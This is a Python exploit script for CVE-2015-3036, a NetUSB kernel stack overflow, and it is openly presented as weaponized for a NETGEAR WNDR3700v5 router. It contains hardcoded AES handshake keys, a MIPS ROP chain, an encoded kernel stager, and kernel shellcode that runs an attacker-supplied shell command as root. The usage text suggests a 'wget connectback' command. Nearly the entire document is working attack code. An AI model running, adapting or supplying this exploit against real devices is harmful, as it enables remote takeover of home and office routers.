#!/usr/bin/env python
#
# CVE-2015-3036 - NetUSB Remote Code Execution exploit (Linux/MIPS) 
# ===========================================================================
# This is a weaponized exploit for the NetUSB kernel vulnerability 
# discovered by SEC Consult Vulnerability Lab. [1]
# 
# I don't like lazy vendors, I've seen some DoS PoC's floating around
# for this bug.. and it's been almost five(!) months. So lets kick it up 
# a notch with an actual proof of concept that yields code exec.
#
# So anyway.. a remotely exploitable kernel vulnerability, exciting eh. ;-)
# 
# Smash stack, ROP, decode, stage, spawn userland process. woo!
#
# Currently this is weaponized for one target device (the one I own, I was
# planning on porting OpenWRT but got sidetracked by the NetUSB stuff in 
# the default firmware image, oooops. ;-D).
#
# This python script is horrible, but its not about the glue, its about
# the tech contained therein. Some things *may* be (intentionally?) botched..
# lets see if "the community" cares enough to develop this any further,
# I need to move on with life. ;-D
# 
# Shoutouts to all my boys & girls around the world, you know who you are!
#
# Peace,
# -- blasty <peter@haxx.in> // 20151013
#
# References:
# [1] : https://www.sec-consult.com/fxdata/seccons/prod/temedia/advisories_txt
# /20150519-0_KCodes_NetUSB_Kernel_Stack_Buffer_Overflow_v10.txt
#KCodes NetUSB是Linux内核模块，可通过IP提供USB设备网络共享功能。由台湾企业盈码科（KCodes）开发。
#KCodes NetUSB模块的run_init_sbus函数存在栈缓冲区溢出漏洞，远程攻击者通过TCP端口20005上的会话，
#运行较长的计算机名，利用此漏洞可执行任意代码。此模块广泛使用在某些NETGEAR产品、TP-LINK产品等。

import os, sys, struct, socket, time
from Crypto.Cipher import AES
def u32(v):
    return struct.pack("<L", v)
def banner():
    print ""
    print "## NetUSB (CVE-2015-3036) remote code execution exploit"
    print "## by blasty <peter@haxx.in>"
    print ""
def usage(prog):
    print "usage   : %s <host> <port> <cmd>" % (prog)
    print "example : %s 127.0.0.1 20005 'wget connectback..." % (prog)
    print ""
banner()
if len(sys.argv) != 4:
    usage(sys.argv[0])
    exit(0)
cmd = sys.argv[3]
# Here's one, give us more! (hint: /proc/kallsyms and objdump, bro)
targets = [
    {
        "name" : "WNDR3700v5 - Linux 2.6.36 (mips32-le)",
        "kernel_base" : 0x80001000,
        # adjust to offset used in 'load_addr_and_jump' gadget
        # should be some big immediate to avoid NUL bytes
        "load_addr_offset" : 4156,
        "gadgets" : {
            # 8c42103c  lw      v0,4156(v0)
            # 0040f809  jalr    v0
            # 00000000  nop
            'load_addr_and_jump' : 0x1f548,
            # 8fa20010  lw      v0,16(sp)
            # 8fbf001c  lw      ra,28(sp)
            # 03e00008  jr      ra
            # 27bd0020  addiu   sp,sp,32
            'load_v0_and_ra' : 0x34bbc,
            # 27b10010  addiu   s1,sp,16
            # 00602021  move    a0,v1
            # 0040f809  jalr    v0
            # 02202821  move    a1,s1
            'move_sp_plus16_to_s1' : 0x63570,
            # 0220f809  jalr    s1
            # 00000000  nop
            'jalr_s1' : 0x63570,
            'a_r4k_blast_dcache' : 0x6d4678,
            'kmalloc' : 0xb110c,
            'ks_recv' : 0xc145e270,
            'call_usermodehelper_setup' : 0x5b91c,
            'call_usermodehelper_exec' :  0x5bb20
        }
    }
]
# im lazy, hardcoded to use the only avail. target for now
# hey, at least I made it somewhat easy to easily add new targets
target = targets[0]
# hullo there.
hello = "\x56\x03"
# sekrit keyz that are hardcoded in netusb.ko, sorry KCodes
# people, this is not how you implement auth. lol.
aesk0 = "0B7928FF6A76223C21A3B794084E1CAD".decode('hex')
aesk1 = "A2353556541CFE44EC468248064DE66C".decode('hex')
key = aesk1
IV = "\x00"*16
mode = AES.MODE_CBC
aes = AES.new(key, mode, IV=IV)
aesk0_d = aes.decrypt(aesk0)
aes2 = AES.new(aesk0_d, mode, IV="\x00"*16)
s = socket.create_connection((sys.argv[1], int(sys.argv[2], 0)))
print "[>] sending HELLO pkt"
s.send(hello)
time.sleep(0.2)
verify_data = "\xaa"*16
print "[>] sending verify data"
s.send(verify_data)
time.sleep(0.2)
print "[>] reading response"
data = s.recv(0x200)
print "[!] got %d bytes .." % len(data)
print "[>] data: " + data.encode('hex')
pkt = aes2.decrypt(data)
print "[>] decr: " + pkt.encode("hex")
if pkt[0:16] != "\xaa"*16:
    print "[!] error: decrypted rnd data mismatch :("
    exit(-1)
rnd = data[16:]
aes2 = AES.new(aesk0_d, mode, IV="\x00"*16)
pkt_c = aes2.encrypt(rnd)
print "[>] sending back crypted random data"
s.send(pkt_c)
# Once upon a time.. 
d = "A"
# hardcoded decoder_key, this one is 'safe' for the current stager
decoder_key = 0x1337babf
# NUL-free mips code which decodes the next stage,
# flushes the d-cache, and branches there.
# loosely inspired by some shit Julien Tinnes once wrote.
decoder_stub = [
    0x0320e821, # move    sp,t9
    0x27a90168, # addiu    t1,sp,360
    0x2529fef0, # addiu    t1,t1,-272
    0x240afffb, # li    t2,-5
    0x01405027, # nor    t2,t2,zero
    0x214bfffc, # addi    t3,t2,-4
    0x240cff87, # li    t4,-121
    0x01806027,    # nor    t4,t4,zero
    0x3c0d0000,    # [8] lui    t5, xorkey@hi
    0x35ad0000, # [9] ori    t5,t5, xorkey@lo
    0x8d28fffc, # lw    t0,-4(t1)
    0x010d7026, # xor    t6,t0,t5
    0xad2efffc, # sw    t6,-4(t1)
    0x258cfffc, # addiu    t4,t4,-4
    0x140cfffb, # bne    zero,t4,0x28
    0x012a4820, # add    t1,t1,t2
    0x3c190000, # [16] lui    t9, (a_r4k_blast_dcache-0x110)@hi
    0x37390000, # [17] ori    t9,t9,(a_r4k_blast_dcache-0x110)@lo
    0x8f390110, # lw    t9,272(t9)
    0x0320f809, # jalr    t9
    0x3c181234, # lui    t8,0x1234
]
# patch xorkey into decoder stub
decoder_stub[8] = decoder_stub[8] | (decoder_key >> 16)
decoder_stub[9] = decoder_stub[9] | (decoder_key & 0xffff)
r4k_blast_dcache = target['kernel_base']
r4k_blast_dcache = r4k_blast_dcache + target['gadgets']['a_r4k_blast_dcache']
# patch the r4k_blast_dcache address in decoder stub
decoder_stub[16] = decoder_stub[16] | (r4k_blast_dcache >> 16)
decoder_stub[17] = decoder_stub[17] | (r4k_blast_dcache & 0xffff)
# pad it out
d += "A"*(233-len(d))
# kernel payload stager
kernel_stager = [
    0x27bdffe0, # addiu    sp,sp,-32
    0x24041000, # li    a0,4096
    0x24050000, # li    a1,0
    0x3c190000, # [3] lui    t9,kmalloc@hi
    0x37390000,    # [4] ori    t9,t9,kmalloc@lo
    0x0320f809, # jalr    t9
    0x00000000, # nop
    0x0040b821, # move    s7,v0
    0x02602021, # move    a0,s3
    0x02e02821, # move    a1,s7
    0x24061000, # li    a2,4096
    0x00003821, # move    a3,zero
    0x3c190000,    # [12] lui    t9,ks_recv@hi
    0x37390000, # [13] ori    t9,t9,ks_recv@lo
    0x0320f809, # jalr    t9
    0x00000000, # nop
    0x3c190000, # [16] lui    t9,a_r4k_blast_dcache@hi
    0x37390000, # [17] ori    t9,t9,a_r4k_blast_dcache@lo
    0x8f390000, # lw    t9,0(t9)
    0x0320f809, # jalr    t9
    0x00000000, # nop
    0x02e0f809, # jalr    s7
    0x00000000     # nop
]
kmalloc = target['kernel_base'] + target['gadgets']['kmalloc']
ks_recv = target['gadgets']['ks_recv']
# patch kernel stager
kernel_stager[3] = kernel_stager[3] | (kmalloc >> 16)
kernel_stager[4] = kernel_stager[4] | (kmalloc & 0xffff)
kernel_stager[12] = kernel_stager[12] | (ks_recv >> 16)
kernel_stager[13] = kernel_stager[13] | (ks_recv & 0xffff)
kernel_stager[16] = kernel_stager[16] | (r4k_blast_dcache >> 16)
kernel_stager[17] = kernel_stager[17] | (r4k_blast_dcache & 0xffff)
# a ROP chain for MIPS, always ew.
rop = [
    # this gadget will
    # v0 = *(sp+16)
    # ra = *(sp+28)
    # sp += 32
    target['kernel_base'] + target['gadgets']['load_v0_and_ra'],
    # stack for the g_load_v0_and_ra gadget
    0xaaaaaaa1, # sp+0
    0xaaaaaaa2, # sp+4
    0xaaaaaaa3, # sp+8
    0xaaaaaaa4, # sp+12
    r4k_blast_dcache - target['load_addr_offset'], # sp+16 / v0
    0xaaaaaaa6, # sp+20
    0xaaaaaaa7, # sp+24
    # this gadget will
    # v0 = *(v0 + 4156)
    # v0();
    # ra = *(sp + 20)
    # sp += 24
    # ra();
    target['kernel_base'] + target['gadgets']['load_addr_and_jump'], # sp+28
    0xbbbbbbb2,
    0xccccccc3,
    0xddddddd4,
    0xeeeeeee5,
    0xeeeeeee6,
    # this is the RA fetched by g_load_addr_and_jump
    target['kernel_base'] + target['gadgets']['load_v0_and_ra'],
    # stack for the g_load_v0_and_ra gadget
    0xaaaaaaa1, # sp+0
    0xaaaaaaa2, # sp+4
    0xaaaaaaa3, # sp+8
    0xaaaaaaa4, # sp+12
    target['kernel_base'] + target['gadgets']['jalr_s1'],  #  sp+16 / v0
    0xaaaaaaa6, # sp+20
    0xaaaaaaa7, # sp+24
    target['kernel_base'] + target['gadgets']['move_sp_plus16_to_s1'], # ra
    
    # second piece of native code getting executed, pivot back in the stack
    0x27b9febc, # t9 = sp - offset
    0x0320f809, # jalr t9 
    0x3c181234, # nop
    0x3c181234, # nop
    # first native code getting executed, branch back to previous 4 opcodes
    0x03a0c821, # move t9, sp
    0x0320f809, # jalr t9
    0x3c181234,
]
# append rop chain to buffer
for w in rop:
    d += u32(w)
# append decoder_stub to buffer
for w in decoder_stub:
    d += u32(w)
# encode stager and append to buffer
for w in kernel_stager:
    d += u32(w ^ decoder_key)
print "[>] sending computername_length.."
time.sleep(0.1)
s.send(struct.pack("<L", len(d)))
print "[>] sending payload.."
time.sleep(0.1)
s.send(d)
time.sleep(0.1)
print "[>] sending stage2.."
# a useful thing to do when you bust straight into the kernel 
# is to go back to userland, huhuhu.
# thanks to jix for the usermodehelper suggestion! :)
kernel_shellcode = [
    0x3c16dead, # lui    s6,0xdead
    0x3c19dead, # lui    t9,0xdead
    0x3739c0de, # ori    t9,t9,0xc0de
    0x2404007c, # li    a0, argv
    0x00972021, # addu    a0,a0,s7
    0x2405008c, # li    a1, argv0
    0x00b72821, # addu    a1,a1,s7
    0xac850000, # sw    a1,0(a0)
    0x24050094, # li    a1, argv1
    0x00b72821, # addu    a1,a1,s7
    0xac850004, # sw    a1,4(a0)
    0x24060097, # li    a2, argv2
    0x00d73021, # addu    a2,a2,s7
    0xac860008, # sw    a2,8(a0)
    0x00802821, # move    a1,a0
    0x2404008c, # li    a0, argv0
    0x00972021, # addu    a0,a0,s7
    0x24060078, # li    a2, envp
    0x00d73021, # addu    a2,a2,s7
    0x24070020, # li    a3,32
    0x3c190000, # [20] lui    t9,call_usermodehelper_setup@hi
    0x37390000, # [21] ori    t9,t9,call_usermodehelper_setup@lo
    # call_usermodehelper_setup(argv[0], argv, envp, GPF_ATOMIC)
    0x0320f809, # jalr    t9
    0x00000000, # nop
    0x00402021, # move    a0,v0
    0x24050002, # li    a1,2
    0x3c190000, # [26] lui    t9,call_usermodehelper_exec@hi
    0x37390000, # [27] ori    t9,t9,call_usermodehelper_exec@lo
    # call_usermodehelper_exec(retval, UHM_WAIT_PROC)
    0x0320f809, # jalr    t9
    0x00000000, # nop
    # envp ptr
    0x00000000,
    # argv ptrs
    0x00000000,
    0x00000000,
    0x00000000,
    0x00000000
]
usermodehelper_setup = target['gadgets']['call_usermodehelper_setup']
usermodehelper_exec = target['gadgets']['call_usermodehelper_exec']
# patch call_usermodehelper_setup into kernel shellcode
kernel_shellcode[20] = kernel_shellcode[20] | (usermodehelper_setup>>16)
kernel_shellcode[21] = kernel_shellcode[21] | (usermodehelper_setup&0xffff)
# patch call_usermodehelper_setup into kernel shellcode
kernel_shellcode[26] = kernel_shellcode[26] | (usermodehelper_exec>>16)
kernel_shellcode[27] = kernel_shellcode[27] | (usermodehelper_exec&0xffff)
payload = ""
for w in kernel_shellcode:
    payload += u32(w)
payload += "/bin/sh\x00"
payload += "-c\x00"
payload += cmd
# and now for the moneyshot
s.send(payload)
print "[~] KABOOM! Have a nice day."
